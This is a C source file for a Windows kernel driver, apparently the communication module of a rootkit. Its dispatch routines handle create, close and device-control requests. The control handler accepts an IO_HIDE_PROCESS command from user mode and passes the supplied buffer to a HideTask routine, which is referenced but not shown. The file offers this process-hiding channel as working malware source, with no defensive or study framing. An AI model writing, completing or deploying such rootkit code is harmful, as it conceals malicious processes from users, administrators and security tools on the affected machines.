#include "communication.h"
#include "messages.h"

NTSTATUS defaultDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIRP)
{
	pIRP->IoStatus.Status = STATUS_SUCCESS;
	pIRP->IoStatus.Information = 0;
	IoCompleteRequest(pIRP, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS CreateCall(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	DebugMessage("CreateCall was called, connection established!\n");

	return STATUS_SUCCESS;
}

NTSTATUS CloseCall(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	DebugMessage("Connection terminated!\n");

	return STATUS_SUCCESS;
}

NTSTATUS IoControl(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
	PVOID inputBuffer = Irp->AssociatedIrp.SystemBuffer;
	//ULONG inputBufferLength = stack->Parameters.DeviceIoControl.InputBufferLength;

	ULONG ControlCode = stack->Parameters.DeviceIoControl.IoControlCode;

	DBG_TRACE("dispatchIOControl", "Received a command");
	DBG_PRINT2("[dispatchIOControl]: Received a command: %d\n", ControlCode);
	DBG_PRINT2("        hide command is: %d\n", IO_HIDE_PROCESS);

	if (ControlCode == IO_HIDE_PROCESS)
	{
		DBG_TRACE("dispatchIOControl", "Hiding Task");
		HideTask((DWORD*)inputBuffer);
		Status = STATUS_SUCCESS;
	}

	Irp->IoStatus.Status = Status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Status;
}